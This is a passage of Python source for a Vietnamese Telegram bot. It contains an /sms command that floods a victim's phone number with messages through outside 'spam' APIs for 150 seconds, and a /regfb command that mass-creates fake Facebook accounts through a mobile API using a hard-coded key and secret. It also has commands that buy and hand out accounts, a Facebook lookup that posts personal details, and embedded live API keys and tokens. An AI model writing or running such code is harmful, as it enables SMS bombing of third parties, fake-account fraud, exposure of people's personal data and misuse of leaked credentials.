        last_update = get_value(personal_info, "Cập nhật lần cuối")
        location = get_value(location_info, "Tên")
        university = get_value(education_info, "Trường Đại học")
        major = get_value(education_info, "Chuyên ngành")
        company = get_value(work_info, "Công ty")
        job_title = get_value(work_info, "Vị trí")

        avatar_url = get_value(images_info, "Avatar", f"https://graph.facebook.com/{fb_id}/picture?width=1500&height=1500")
        if not avatar_url:
            avatar_url = "https://via.placeholder.com/1500?text=No+Image"

        caption = (
            f"<b>🔍 Thông Tin Facebook</b>\n\n"
            f"👤 <b>ID:</b> {fb_id}\n"
            f"👤 <b>Tên:</b> {name} {surname}\n"
            f"🧑 <b>Giới tính:</b> {gender}\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"🎂 <b>Ngày sinh:</b> {birthday}\n"
            f"🔗 <a href='{profile_link}'>Liên kết Facebook</a>\n"
            f"💬 <b>Giới thiệu:</b> {bio}\n"
            f"💑 <b>Tình trạng:</b> {relationship_status}\n"
            f"👥 <b>Người theo dõi:</b> {followers}\n"
            f"👤 <b>Đang theo dõi:</b> {following}\n"
            f"🕑 <b>Múi giờ:</b> {timezone}\n"
            f"🌍 <b>Ngôn ngữ:</b> {language}\n"
            f"📅 <b>Cập nhật lần cuối:</b> {last_update}\n"
            f"📍 <b>Vị trí hiện tại:</b> {location}\n"
            f"🎓 <b>Học vấn:</b> {university} ({major})\n"
            f"💼 <b>Nơi làm việc:</b> {company} - {job_title}\n"
        )

        print(f"[DEBUG] Caption:\n{caption}")  # Kiểm tra nội dung gửi Telegram

        bot.send_photo(message.chat.id, avatar_url, caption=caption, parse_mode='HTML')
        bot.delete_message(message.chat.id, waiting_message.message_id)

    except Exception as e:
        print(f"[ERROR] {e}")
        bot.edit_message_text(f"❌ Lỗi không xác định", message.chat.id, waiting_message.message_id)

#sử lí reg acc fb 282
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


app = {
    'api_key': '882a8490361da98702bf97a021ddc14d',
    'secret': '62f8ce9f74b12f84c123cc23437a4a32'
}

email_prefix = [
    'gmail.com',
    'hotmail.com',
    'yahoo.com',
    'live.com',
    'rocket.com',
    'outlook.com',
]


def create_account_html():
  
    random_birth_day = datetime.strftime(datetime.fromtimestamp(random.randint(
        int(time.mktime(datetime.strptime('1980-01-01', '%Y-%m-%d').timetuple())),
        int(time.mktime(datetime.strptime('1995-12-30', '%Y-%m-%d').timetuple()))
    )), '%Y-%m-%d')

  
    names = {
        'first': ['JAMES', 'JOHN', 'ROBERT', 'MICHAEL', 'WILLIAM', 'DAVID'],
        'last': ['SMITH', 'JOHNSON', 'WILLIAMS', 'BROWN', 'JONES', 'MILLER'],
        'mid': ['Alexander', 'Anthony', 'Charles', 'Dash', 'David', 'Edward']
    }

   
    random_first_name = random.choice(names['first'])
    random_name = f"{random.choice(names['mid'])} {random.choice(names['last'])}"
    password = f'{random.randint(0, 9999999)}?#@'
    full_name = f"{random_first_name} {random_name}"
    md5_time = hashlib.md5(str(time.time()).encode()).hexdigest()

 
    hash_ = f"{md5_time[0:8]}-{md5_time[8:12]}-{md5_time[12:16]}-{md5_time[16:20]}-{md5_time[20:32]}"
    email_rand = f"{full_name.replace(' ', '').lower()}{hashlib.md5((str(time.time()) + datetime.strftime(datetime.now(), '%Y%m%d')).encode()).hexdigest()[0:6]}@{random.choice(email_prefix)}"
    gender = 'M' if random.randint(0, 10) > 5 else 'F'

  
    req = {
        'api_key': app['api_key'],
        'attempt_login': True,
        'birthday': random_birth_day,
        'client_country_code': 'EN',
        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
        'fb_api_req_friendly_name': 'registerAccount',
        'firstname': random_first_name,
        'format': 'json',
        'gender': gender,
        'lastname': random_name,
        'email': email_rand,
        'locale': 'en_US',
        'method': 'user.register',
        'password': password,
        'reg_instance': hash_,
        'return_multiple_errors': True
    }

    sig = ''.join([f'{k}={v}' for k, v in sorted(req.items())])
    ensig = hashlib.md5((sig + app['secret']).encode()).hexdigest()
    req['sig'] = ensig

    api = 'https://b-api.facebook.com/method/user.register'

    def _call(url='', params=None, post=True):
        headers = {
            'User-Agent': '[FBAN/FB4A;FBAV/35.0.0.48.273;FBDM/{density=1.33125,width=800,height=1205};FBLC/en_US;FBCR/;FBPN/com.facebook.katana;FBDV/Nexus 7;FBSV/4.1.1;FBBK/0;]'
        }
        if post:
            response = requests.post(url, data=params, headers=headers, verify=False)
        else:
            response = requests.get(url, params=params, headers=headers, verify=False)
        return response.text

    reg = _call(api, req)
    reg_json = json.loads(reg)
    uid = reg_json.get('session_info', {}).get('uid')
    access_token = reg_json.get('session_info', {}).get('access_token')

 
    error_code = reg_json.get('error_code')
    error_msg = reg_json.get('error_msg')

    if uid is not None and access_token is not None:
       
        return f"""
        <blockquote expandable>
        <b>Birthday 🎂:</b> {random_birth_day}\n
        <b>Fullname ®️:</b> {full_name}\n
        <b>Email 📧 :</b> {email_rand}\n
        <b>Password 🔑:</b> {password}\n
        <b>UID 🆔:</b> {uid}\n
        <b>Token 🎧:</b> {access_token}\n
        </blockquote>
        """
    else:
        
        if error_code and error_msg:
            return f"""
            <b>Error Code:</b> {error_code}\n
            <b>Error Message:</b> {error_msg}\n
            """
        else:
            return "<b>Error:</b> Unknown error occurred. Please try again."


@bot.message_handler(commands=['regfb'])
def send_account_info(message):
    if not check_access(message):  # Kiểm tra quyền
        return
    account_info_html = create_account_html()
    bot.send_message(message.chat.id, account_info_html, parse_mode="HTML")


# Lệnh /lock: Để khóa chat
@bot.message_handler(commands=['lock'])
def lock_chat(message):
    if not is_admin(message):  # Kiểm tra quyền admin
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    try:
        # Khóa chat cho tất cả các thành viên
        bot.restrict_chat_member(message.chat.id, message.chat.id, can_send_messages=False)
        
        # Thông báo cho admin rằng chat đã bị khóa
        bot.reply_to(message, "Chat đã bị khóa. Các thành viên không thể gửi tin nhắn.")

    except Exception as e:
        bot.reply_to(message, 'Không thể khóa chat.')

# Lệnh /unlock: Để mở khóa chat
@bot.message_handler(commands=['unlock'])
def unlock_chat(message):
    if not is_admin(message):  # Kiểm tra quyền admin
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return

    try:
        # Mở khóa chat cho tất cả thành viên
        bot.restrict_chat_member(message.chat.id, message.chat.id, can_send_messages=True)
        
        # Thông báo cho admin rằng chat đã được mở khóa
        bot.reply_to(message, "Chat đã được mở khóa. Các thành viên có thể gửi tin nhắn trở lại.")

    except Exception as e:
        bot.reply_to(message, 'Không thể mở khóa chat. Lỗi: ' + str(e))

@bot.message_handler(commands=['id_you'])
def get_user_id(message):
    if not is_admin(message):  # Kiểm tra quyền admin
        bot.reply_to(message, "🚫 Bạn không có quyền sử dụng lệnh này!")
        return
    # Kiểm tra xem tin nhắn có phải là trả lời một tin nhắn khác không
    if not message.reply_to_message:
        bot.reply_to(message, '<blockquote>Vui lòng trả lời tin nhắn của người mà bạn muốn lấy ID.</blockquote>', parse_mode='HTML')
        return
    
    # Lấy ID của người dùng mà bạn đang trả lời
    user_id = message.reply_to_message.from_user.id
    username = message.reply_to_message.from_user.username or "Không có username"

    # Gửi ID của người dùng
    bot.reply_to(message, f'<blockquote>ID của người dùng: <b>{user_id}</b></blockquote>', parse_mode='HTML')


@bot.message_handler(content_types=['new_chat_members'])
def welcome_new_member(message):
    markup = types.InlineKeyboardMarkup()
    seachADM = types.InlineKeyboardButton(text='Admin', callback_data='Admin')
    markup.add(seachADM)
    # Kiểm tra nếu có thành viên mới
    if not message.new_chat_members:
        return

    for new_member in message.new_chat_members:
        # Lấy tên người dùng mới (username) hoặc tên hiển thị (first name)
        username = new_member.username
        first_name = new_member.first_name
        
        # Tạo thông điệp chào mừng
        if username:
            user_info = f"@{username}"
        else:
            user_info = first_name
        
        # Nội dung tin nhắn chào mừng với thẻ HTML
        welcome_text = f'''
<blockquote>
🎉 Chào mừng {user_info} đến với nhóm! 🎉
Hy vọng bạn sẽ có khoảng thời gian vui vẻ ở đây!
Nhập /help để xem danh sách lệnh !!!
Có vấn đề gì hay mua VIP liên hệ ADMIN !!!
ZALO: https://tinyurl.com/2y79qkkp
</blockquote>
        '''
          # URL của video chào mừng
        video_url = "https://files.catbox.moe/0m6k6z.mp4"
        bot.send_video(message.chat.id, video_url, parse_mode='HTML')


        # Gửi tin nhắn chào mừng
        bot.send_message(message.chat.id, welcome_text, parse_mode='HTML')

import cohere
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

GOOGLE_MAPS_URL = "https://www.google.com/maps/search/?api=1&query="
WEATHER_API_KEY = "03e4e3da0c689afa7f351d7972f48ffb"
COHERE_API_KEY = '7AlG9exDo3m1YVlhc3ow8Zu1lYi8EtcjXfEE5mgE'
co = cohere.Client(COHERE_API_KEY)

def get_geocode(city_name):
    try:
        geocode_url = f"http://api.openweathermap.org/geo/1.0/direct?q={city_name}&limit=1&appid={WEATHER_API_KEY}"
        response = requests.get(geocode_url)
        data = response.json()
        if response.status_code == 200 and data:
            return data[0]['lat'], data[0]['lon']
        return None, None
    except Exception as e:
        logger.error(f"Error fetching geocode")
        return None, None

def get_weather_data(lat, lon):
    try:
        base_url = "http://api.openweathermap.org/data/2.5/weather?"
        complete_url = f"{base_url}appid={WEATHER_API_KEY}&lat={lat}&lon={lon}&units=metric"
        response = requests.get(complete_url)
        weather_data = response.json()
        return weather_data
    except Exception as e:
        logger.error(f"")
        return {}

def translate_weather_description(description):
    try:
        translator = Translator()
        return translator.translate(description, src='en', dest='vi').text
    except Exception as e:
        logger.error(f"Error translating description: {e}")
        return description

def format_weather_message(weather_data, city):
    try:
        if weather_data.get('cod') != 200:
            return f"Error: {weather_data.get('message', '❌ Không Tìm Thấy Vị Trí')}"
        
        country = weather_data['sys']['country']
        lat = weather_data['coord']['lat']
        lon = weather_data['coord']['lon']
        map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
        description = weather_data['weather'][0]['description']
        description_vn = translate_weather_description(description)
        
        temp = weather_data['main']['temp']
        feels_like = weather_data['main']['feels_like']
        temp_min = weather_data['main']['temp_min']
        temp_max = weather_data['main']['temp_max']
        
        pressure = weather_data['main']['pressure']
        humidity = weather_data['main']['humidity']
        cloudiness = weather_data['clouds']['all']
        wind_speed = weather_data['wind']['speed']
        wind_deg = weather_data['wind']['deg']

        uvi = None
        uvi_response = requests.get(f'https://api.openweathermap.org/data/2.5/uvi?lat={lat}&lon={lon}&appid={WEATHER_API_KEY}')
        if uvi_response.status_code == 200:
            uvi = uvi_response.json().get('value')

        aqi = None
        air_pollution_response = requests.get(f'http://api.openweathermap.org/data/2.5/air_pollution?lat={lat}&lon={lon}&appid={WEATHER_API_KEY}')
        if air_pollution_response.status_code == 200:
            aqi = air_pollution_response.json().get('list', [{}])[0].get('main', {}).get('aqi')

        precipitation = weather_data.get('rain', {}).get('1h', 0)
        precipitation_percentage = round(precipitation * 100, 2)  
        message = (
            f"<pre>"
            f"╭────⭓Thời Tiết\n"
            f"│🔆Thông Tin Thời Tiết ở {city}\n"
            f"│🌍 Thành phố: {city}\n"
            f"│🔗 Link bản đồ: <a href='{map_link}'>Xem bản đồ</a>\n"
            f"│☁️ Thời tiết: {description_vn}\n"
            f"│🌡 Nhiệt độ hiện tại: {temp}°C\n"
            f"│🌡️ Cảm giác như: {feels_like}°C\n"
            f"│🌡️ Nhiệt độ tối đa: {temp_max}°C\n"
            f"│🌡️ Nhiệt độ tối thiểu: {temp_min}°C\n"
            f"│🍃 Áp suất: {pressure} hPa\n"
            f"│🫧 Độ ẩm: {humidity}%\n"
            f"│☁️ Mức độ mây: {cloudiness}%\n"
            f"│🌬️ Tốc độ gió: {wind_speed} m/s\n"
            f"│🌐 Quốc gia: {country}\n"
            f"│🌬 Hướng gió: {wind_deg}°\n"
        )

        if uvi is not None:
            message += f"│☀️ Chỉ số UV: {uvi}\n"
        if aqi is not None:
            message += f"│🏭 Chất lượng không khí: {aqi}\n"
        if precipitation > 0:
            message += f"│🌧 Lượng mưa: {precipitation} mm\n"
            message += f"│🌧 Phần trăm lượng mưa: {precipitation_percentage}%\n"

        message += f"╰───────────── ⭐</pre>\n"
        return message
    except KeyError as e:
        logger.error(f"Error formatting weather message: {e}")
        return f"❌ Lỗi Nghiêm Trọng"

@bot.message_handler(commands=['thoitiet'])
def thoitiet(message):
    if not bot_active:
        bot.reply_to(message, text="🤖 VuThiHoa-BOT\nVuThiHoa Đang Tắt Hiện Các Thành Viên Không Thể Sử Dụng")
        return

    try:
        if len(message.text.split()[1:]) < 1:
            bot.reply_to(message, text="🤖 VuThiHoa-BOT\n🤖 Usage: /thoitiet <Tỉnh Thành>")
            return
        
        city_name = ' '.join(message.text.split()[1:]).strip()
        lat, lon = get_geocode(city_name)
        
        if lat is not None and lon is not None:
            weather_data = get_weather_data(lat, lon)
            weather_message = format_weather_message(weather_data, city_name)
        else:
            weather_message = "❌ Không thể tìm thấy tọa độ cho thành phố này. Vui lòng kiểm tra lại tên thành phố."

        bot.reply_to(message, text=weather_message, parse_mode='HTML')

    except Exception as e:
        logger.error(f"Hard Target: {e}")
        bot.reply_to(message, text="❌ Lỗi Máy Chủ")

# Cấu hình logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Thông tin token API
USER_TOKEN = "TNDCEA8RFAE8KY5OHW9WRFUM8IB44W50FC1Y"
KIOSK_TOKEN = "59FZGLNXP3W4AICQ99Q3"

class AccountManager:
    def __init__(self, userToken, kioskToken):
        self.userToken = userToken
        self.kioskToken = kioskToken

    # Hàm mua sản phẩm
    def buy_account(self):
        try:
            url = f"https://taphoammo.net/api/buyProducts?kioskToken={self.kioskToken}&userToken={self.userToken}&quantity=1"
            response = requests.get(url)
            response.raise_for_status()
            data = response.json()
            if data.get("success") == "true":
                order_id = data.get("order_id")
                logger.info(f"✅ Mua hàng thành công, Order ID: {order_id}")
                return order_id
            else:
                logger.error(f"❌ Mua hàng thất bại: {data.get('description', 'Lỗi không xác định')}")
                return None
        except Exception as e:
            logger.error(f"❌ Đã xảy ra lỗi khi mua hàng: {str(e)}")
            return None

    # Hàm lấy tài khoản đã mua
    def get_account(self, order_id, max_attempts=5, wait_time=5):
        attempt = 0
        while attempt < max_attempts:
            try:
                url = f"https://taphoammo.net/api/getProducts?orderId={order_id}&userToken={self.userToken}"
                response = requests.get(url)
                response.raise_for_status()
                data = response.json()

                if data.get("success") == "true":
                    products = data.get("data", [])
                    if products:
                        return products[0]["product"]  # Trả về tài khoản đầu tiên
                elif "Order in processing" in data.get("description", ""):
                    logger.info(f"⏳ Đơn hàng {order_id} vẫn đang được xử lý, thử lại...")
                    time.sleep(wait_time)  # Đợi một chút trước khi thử lại
                else:
                    logger.error(f"❌ Lỗi lấy tài khoản: {data.get('description', 'Lỗi không xác định')}")
                    return None
            except Exception as e:
                logger.error(f"❌ Đã xảy ra lỗi khi lấy tài khoản: {str(e)}")
                return None
            attempt += 1
        
        logger.error(f"❌ Vượt quá số lần thử, không thể lấy tài khoản.")
        return None

# Khởi tạo AccountManager
manager = AccountManager(USER_TOKEN, KIOSK_TOKEN)

# Lưu trữ các key đã tạo
user_keys = {}

# Hàm tạo key ngắn hơn
def generate_unique_key(user_id):
    now = datetime.now().strftime('%Y%m%d%H%M%S')  # Dấu thời gian chính xác đến từng giây
    raw_key = f"{user_id}_{now}"
    unique_key = hashlib.md5(raw_key.encode()).hexdigest()[:10]  # Lấy 10 ký tự đầu
    return unique_key

# Lệnh /getkey_reg
@bot.message_handler(commands=['getkey_reg'])
def getkey_reg(message):
    if not check_access(message):  # Kiểm tra quyền
        return

    user_id = str(message.from_user.id)
    unique_key = generate_unique_key(user_id)

    # Lưu key mới nhất cho người dùng
    user_keys[user_id] = unique_key

    bot.reply_to(message, text='🔄 VUI LÒNG ĐỢI TRONG GIÂY LÁT...')

    # Rút gọn URL chứa key
    key_url = f"https://www.thengoc.x10.mx/?key={unique_key}"
    api_token = '678872637ebb6e7ecd0fcbb6'

    try:
        response = requests.get(f'https://link4m.co/api-shorten/v2?api={api_token}&url={key_url}')
        url = response.json()

        if 'shortenedUrl' in url:
            url_key = url['shortenedUrl']
        else:
            bot.reply_to(message, '❌ Không tìm thấy shortenedUrl trong phản hồi.')
            return

    except requests.RequestException as e:
        bot.reply_to(message, '❌ Đã xảy ra lỗi khi kết nối đến API.')
        print(f"Request error: {e}")
        return

    text = f'''
- LINK LẤY KEY REG CỦA @{message.from_user.username} NGÀY {datetime.now().strftime('%d-%m-%Y %H:%M:%S')} LÀ: {url_key} 
- KHI LẤY KEY XONG, DÙNG LỆNH /key_reg <key> ĐỂ KÍCH HOẠT QUYỀN SỬ DỤNG REG.
    '''
    bot.reply_to(message, text)

# Lệnh /key_reg
@bot.message_handler(commands=['key_reg'])
def key_reg(message):
    if not check_access(message):  # Kiểm tra quyền
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, '❌ VUI LÒNG NHẬP KEY. DÙNG /key_reg <key>')
        return

    user_id = str(message.from_user.id)
    provided_key = message.text.split()[1]

    # Kiểm tra key có khớp với key mới nhất đã tạo không
    if user_id in user_keys and user_keys[user_id] == provided_key:
        # Tạo file user_reg.txt nếu chưa có
        user_reg_file = './user_reg.txt'
        if not os.path.exists(user_reg_file):
            with open(user_reg_file, 'w') as f:
                pass  # Tạo file nếu chưa có

        # Kiểm tra nếu UID đã có trong user_reg.txt
        with open(user_reg_file, 'a+') as f:
            f.seek(0)
            existing_uids = f.read().splitlines()
            if user_id in existing_uids:
                bot.reply_to(message, '❗ UID CỦA BẠN ĐÃ ĐƯỢC KÍCH HOẠT TRƯỚC ĐÓ.')
                return
            else:
                # Thêm UID vào user_reg.txt
                f.write(f'{user_id}\n')
                bot.reply_to(message, '☑️ KEY REG HỢP LỆ ☑️. BẠN ĐÃ ĐƯỢC PHÉP SỬ DỤNG LỆNH /reg.')

        # Xóa key sau khi sử dụng
        del user_keys[user_id]

    else:
        bot.reply_to(message, '❌ KEY KHÔNG HỢP LỆ HOẶC ĐÃ HẾT HẠN. VUI LÒNG TẠO KEY MỚI.')

# Lệnh /reg
@bot.message_handler(commands=['reg'])
def handle_reg(message):
    user_id = str(message.from_user.id)
    user_reg_file = './user_reg.txt'

    # Kiểm tra nếu file user_reg.txt tồn tại và UID có trong file
    if not os.path.exists(user_reg_file):
        bot.reply_to(message, '❌ Bạn chưa kích hoạt quyền sử dụng lệnh. Vui lòng dùng /getkey_reg và /key_reg để xài lệnh.')
        return

    with open(user_reg_file, 'r') as f:
        existing_uids = f.read().splitlines()
        if user_id not in existing_uids:
            bot.reply_to(message, '❌ Bạn chưa get key nên ko có quyền sử dụng lệnh. Vui lòng dùng /getkey_reg và /key_reg để xài lệnh.')
            return

    bot.reply_to(message, "🔄 Đang xử lý, vui lòng chờ...  tài khoản sẽ gửi cho bạn và tin nhắn.")

    try:
        # Bước 1: Mua sản phẩm
        order_id = manager.buy_account()
        if not order_id:
            bot.reply_to(message, "❌ Bạn vui lòng nhắn tin riêng cho Bot và xài lệnh /start rồi quay lại nhóm để xài lệnh /reg.")
            return

        # Bước 2: Lấy tài khoản đã mua
        account_data = manager.get_account(order_id)
        if account_data:
            account, password = account_data.split("|")

            # Gửi thông tin riêng cho người dùng
            bot.send_message(
                chat_id=message.from_user.id,  # Gửi tin nhắn riêng tư qua user_id
                text=f"✅ Đây là tài khoản của bạn:\nLưu ý không đổi mật khẩu mail vì sẽ gây die mail\n👤 **Tài khoản:** `{account}`\n🔑 **Mật khẩu:** `{password}`",
                parse_mode="Markdown"
            )

            # Xóa UID khỏi file user_reg.txt sau khi sử dụng lệnh /reg
            with open(user_reg_file, 'r') as f:
                lines = f.readlines()
            with open(user_reg_file, 'w') as f:
                for line in lines:
                    if line.strip() != user_id:
                        f.write(line)
        else:
            bot.reply_to(message, "❌  Có Thể Đang Lỗi Gì Đó Bạn Xài Tạm Lệnh /reg1 Đi.")
    except Exception as e:
        bot.reply_to(message, "❌ Có Thể Đang Lỗi Gì Đó Bạn Xài Tạm Lệnh /reg1 Đi.")
        print(f"Lỗi: {e}")

# Cấu hình logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Thông tin token API
USER_TOKEN1 = "TNDCEA8RFAE8KY5OHW9WRFUM8IB44W50FC1Y"
KIOSK_TOKEN1 = "Z6UC3M428M637RN5ILJB"

class AccountManager:
    def __init__(self, userToken, kioskToken):
        self.userToken = userToken
        self.kioskToken = kioskToken

    # Hàm mua sản phẩm
    def buy_account(self):
        try:
            url = f"https://taphoammo.net/api/buyProducts?kioskToken={self.kioskToken}&userToken={self.userToken}&quantity=1"
            response = requests.get(url)
            response.raise_for_status()
            data = response.json()
            if data.get("success") == "true":
                order_id = data.get("order_id")
                logger.info(f"✅ Mua hàng thành công, Order ID: {order_id}")
                return order_id
            else:
                logger.error(f"❌ Mua hàng thất bại: {data.get('description', 'Lỗi không xác định')}")
                return None
        except Exception as e:
            logger.error(f"❌ Đã xảy ra lỗi khi mua hàng: {str(e)}")
            return None

    # Hàm lấy tài khoản đã mua
    def get_account(self, order_id, max_attempts=5, wait_time=5):
        attempt = 0
        while attempt < max_attempts:
            try:
                url = f"https://taphoammo.net/api/getProducts?orderId={order_id}&userToken={self.userToken}"
                response = requests.get(url)
                response.raise_for_status()
                data = response.json()

                if data.get("success") == "true":
                    products = data.get("data", [])
                    if products:
                        return products[0]["product"]  # Trả về tài khoản đầu tiên
                elif "Order in processing" in data.get("description", ""):
                    logger.info(f"⏳ Đơn hàng {order_id} vẫn đang được xử lý, thử lại...")
                    time.sleep(wait_time)  # Đợi một chút trước khi thử lại
                else:
                    logger.error(f"❌ Lỗi lấy tài khoản: {data.get('description', 'Lỗi không xác định')}")
                    return None
            except Exception as e:
                logger.error(f"❌ Đã xảy ra lỗi khi lấy tài khoản: {str(e)}")
                return None
            attempt += 1
        
        logger.error(f"❌ Vượt quá số lần thử, không thể lấy tài khoản.")
        return None

# Lệnh /reg
@bot.message_handler(commands=['reg1'])
def handle_reg1(message):
    user_id = str(message.from_user.id)
    user_reg_file = './user_reg.txt'

    # Kiểm tra nếu file user_reg.txt tồn tại và UID có trong file
    if not os.path.exists(user_reg_file):
        bot.reply_to(message, '❌ Bạn chưa kích hoạt quyền sử dụng lệnh. Vui lòng dùng /getkey_reg và /key_reg để xài lệnh.')
        return

    with open(user_reg_file, 'r') as f:
        existing_uids = f.read().splitlines()
        if user_id not in existing_uids:
            bot.reply_to(message, '❌ Bạn chưa get key nên ko có  quyền sử dụng lệnh. Vui lòng dùng /getkey_reg và /key_reg để xài lệnh.')
            return

    bot.reply_to(message, "🔄 Đang xử lý, vui lòng chờ...  tài khoản sẽ gửi cho bạn và tin nhắn.")

    try:
        # Bước 1: Mua sản phẩm
        order_id = manager.buy_account()
        if not order_id:
            bot.reply_to(message, "❌ Bạn vui lòng nhắn tin riêng cho Bot và xài lệnh /start rồi quay lại nhóm để xài lệnh /reg.")
            return

        # Bước 2: Lấy tài khoản đã mua
        account_data = manager.get_account(order_id)
        if account_data:
            account, password = account_data.split("|")

            # Gửi thông tin riêng cho người dùng
            bot.send_message(
                chat_id=message.from_user.id,  # Gửi tin nhắn riêng tư qua user_id
                text=f"✅ Đây là tài khoản của bạn:\nLưu ý không đổi mật khẩu mail vì sẽ gây die mail\n👤 **Tài khoản:** `{account}`\n🔑 **Mật khẩu:** `{password}`",
                parse_mode="Markdown"
            )

            # Xóa UID khỏi file user_reg.txt sau khi sử dụng lệnh /reg
            with open(user_reg_file, 'r') as f:
                lines = f.readlines()
            with open(user_reg_file, 'w') as f:
                for line in lines:
                    if line.strip() != user_id:
                        f.write(line)
        else:
            bot.reply_to(message, "❌  Có Thể Đang Lỗi Gì Đó Bạn Xài Tạm Lệnh /reg1 Đi.")
    except Exception as e:
        bot.reply_to(message, "❌  Có Thể Đang Lỗi Gì Đó Bạn Xài Tạm Lệnh /reg1 Đi.")
        print(f"Lỗi: {e}")

# Đảm bảo file reg_VIP.txt tồn tại
if not os.path.exists("./reg_VIP.txt"):
    open("./reg_VIP.txt", "w").close()

@bot.message_handler(commands=['regvip'])
def reg_vip(message):
    user_id = str(message.from_user.id)

    # Kiểm tra UID trong file reg_VIP.txt
    with open("./reg_VIP.txt", "r") as file:
        lines = file.readlines()

    matched_line = None
    for line in lines:
        if line.startswith(user_id):
            matched_line = line.strip()
            break

    if not matched_line:
        bot.reply_to(message, '❌ Bạn không có quyền sử dụng lệnh /regvip hoặc đã hết lượt sử dụng. Vui lòng liên hệ admin.')
        return

    _, usage_limit = matched_line.split("|")
    usage_limit = int(usage_limit)

    if usage_limit <= 0:
        bot.reply_to(message, '❌ Bạn đã hết lượt sử dụng lệnh /regvip. Vui lòng liên hệ admin.')
        return

    bot.reply_to(message, "🔄 Đang xử lý, vui lòng chờ...")

    try:
        # Mua sản phẩm
        order_id = manager.buy_account()
        if not order_id:
            bot.reply_to(message, "❌ Không lấy thành công, vui lòng thử lại sau.")
            return

        # Lấy tài khoản đã mua
        account_data = manager.get_account(order_id)
        if account_data:
            account, password = account_data.split("|")

            # Gửi thông tin riêng cho người dùng
            bot.send_message(
                chat_id=message.from_user.id,  # Gửi tin nhắn riêng tư qua user_id
                text=f"✅ Đây là tài khoản của bạn:\nLưu ý không đổi mật khẩu mail vì sẽ gây die mail\n👤 **Tài khoản:** `{account}`\n🔑 **Mật khẩu:** `{password}`",
                parse_mode="Markdown"
            )

            # Giảm số lần sử dụng còn lại và cập nhật file reg_VIP.txt
            updated_lines = []
            for line in lines:
                if line.strip() == matched_line:
                    updated_lines.append(f"{user_id}|{usage_limit - 1}\n")
                else:
                    updated_lines.append(line)

            with open("./reg_VIP.txt", "w") as file:
                file.writelines(updated_lines)

            bot.reply_to(message, f"✅ Bạn đã sử dụng thành công, tài khoản sẽ gửi cho bạn và tin nhắn. Số lần còn lại: {usage_limit - 1}")
        else:
            bot.reply_to(message, "❌ Không lấy được tài khoản, vui lòng thử lại sau.")
    except Exception as e:
        bot.reply_to(message, "❌ Đã xảy ra lỗi. Vui lòng thử lại sau.")
        print(f"Lỗi: {e}")

last_sms_time = {}
active_sms_requests = {}  # Lưu trữ trạng thái API đang hoạt động
video_url = "https://files.catbox.moe/2vx7k6.mp4"
bot_active = True

@bot.message_handler(commands=["sms"])
def sms(message):
    global active_sms_requests

    if not bot_active:
        bot.reply_to(message, "🤖 Bot hiện đang tắt, vui lòng thử lại sau!")
        return

    user_id = message.from_user.id
    username = message.from_user.username or "Unknown User"
    args = message.text.split()[1:]

    if len(args) < 1:
        bot.reply_to(message, "🤖 Sử dụng: /sms <SỐ ĐIỆN THOẠI>")
        return

    phone = args[0]

    # Kiểm tra cooldown nếu không phải admin
    if user_id not in ADMIN_ID:
        last_time = last_sms_time.get(user_id, 0)
        current_time = time.time()

        if current_time - last_time < 100:
            remaining_time = int(100 - (current_time - last_time))
            bot.reply_to(message, f"⏳ Vui lòng chờ {remaining_time} giây để tiếp tục!")
            return

        last_sms_time[user_id] = current_time

    # Kiểm tra xem số điện thoại đã được spam chưa
    if phone in active_sms_requests:
        bot.reply_to(message, f"⚠️ Số {phone} đang được spam. Vui lòng thử lại sau 150 giây!")
        return

    # URLs API spam
    url1 = f"http://160.191.245.126:5000/vsteam/api?key=tmrvirus-free&sdt={phone}"
    url2 = f"https://api.natnetwork.sbs/spamsms?phone={phone}&count=10"

    active_sms_requests[phone] = True

    bot.reply_to(message, f"🚀 Đang bắt đầu spam SMS cho số: {phone}. Quá trình sẽ diễn ra trong 150 giây.")
    threading.Thread(target=spam_sms, args=(phone, url1, url2, message, username)).start()

def spam_sms(phone, url1, url2, message, username):
    try:
        start_time = time.time()
        end_time = start_time + 150  # Đặt thời gian kết thúc là 150 giây
        video_sent = False  # Đảm bảo video chỉ được gửi một lần

        while time.time() < end_time:
            api1_success, api2_success = False, False

            # Gửi request đến API 1 (không báo lỗi nếu lỗi)
            try:
                response1 = requests.get(url1, timeout=10)
                if response1.status_code == 200 and response1.json().get('Status') == "[GỬI TẤN CÔNG THÀNH CÔNG SMS]":
                    api1_success = True
            except requests.exceptions.RequestException:
                pass  # API 1 lỗi thì bỏ qua

            # Gửi request đến API 2 (không báo lỗi nếu lỗi)
            try:
                response2 = requests.get(url2, timeout=10)
                if response2.status_code == 200:
                    api2_success = True
            except requests.exceptions.RequestException:
                pass  # API 2 lỗi thì bỏ qua

            # Nếu có ít nhất một API thành công và video chưa gửi, gửi video một lần
            if (api1_success or api2_success) and not video_sent:
                message_text = (f'''
> ┌──────⭓ SPAM SMS ⭓──────
> │» User: @{username} đã gửi spam
> │» Spam: Thành Công [✓]
> │» Phone: {phone}
> │» Admin: Ngocdoian 
> │» Telegram Admin: Ngocdoian
> └────────────[✓]─────────
''')
                # Gửi video với một caption duy nhất
                bot.send_video(message.chat.id, video_url, caption=message_text, parse_mode='html')
                video_sent = True  # Đánh dấu là đã gửi video

            time.sleep(5)  # Chờ 5 giây giữa mỗi lần gửi API

    finally:
        # Xóa số điện thoại khỏi danh sách đang spam sau 150 giây
        if phone in active_sms_requests:
            del active_sms_requests[phone]


@bot.message_handler(commands=["down"])
def download_content(message):
    try:
        # Kiểm tra cú pháp lệnh
        args = message.text.split(maxsplit=1)
        if len(args) != 2:
            bot.reply_to(message, "❌ Vui lòng sử dụng lệnh như sau: /down <link video>")
            return

        video_link = args[1].strip()
        api_url = f"https://keyherlyswar.x10.mx/Apidocs/downall.php?link={video_link}"
        response = requests.get(api_url)

        # Kiểm tra kết nối API
        if response.status_code != 200:
